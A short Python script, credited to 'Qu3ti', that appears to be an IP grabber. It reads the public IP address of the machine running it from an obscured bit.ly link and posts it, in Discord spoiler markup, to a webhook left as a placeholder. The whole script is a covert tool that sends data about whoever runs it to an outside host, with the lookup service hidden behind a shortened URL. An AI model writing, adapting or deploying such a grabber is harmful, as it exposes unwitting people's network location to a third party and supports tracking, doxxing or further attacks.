#By Qu3ti
from urllib.request import Request, urlopen
import requests
ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
#Webhook
webhook = 'Webhook'
message = (f'IP: ||{ip}||')
data = {
	    'content': message
        	}
r = requests.post(webhook, data)

        
